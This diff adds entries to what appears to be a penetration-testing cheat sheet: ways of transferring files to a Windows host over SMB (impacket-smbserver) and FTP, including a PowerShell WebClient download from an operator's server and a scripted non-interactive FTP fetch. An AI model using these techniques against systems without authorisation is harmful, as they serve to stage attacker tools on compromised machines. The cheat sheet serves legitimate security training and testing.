@@ -786,6 +786,41 @@ PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 ```
 
+- SMB
+
+```
+$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+C:\> net use n: \\<IP address>\smbshare /user:test test
+```
+
+- FTP
+
+```
+$ sudo pip3 install pyftpdlib
+$ sudo python3 -m pyftpdlib --port 21
+PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://<IP address>/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+- FTP Non-Interactively
+
+```
+C:\> echo open 192.168.49.128 > ftpcommand.txt
+C:\> echo USER anonymous >> ftpcommand.txt
+C:\> echo binary >> ftpcommand.txt
+C:\> echo GET file.txt >> ftpcommand.txt
+C:\> echo bye >> ftpcommand.txt
+C:\> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\>cat file.txt
+This is a test file
+```
+
 - Host Files
 
 ```
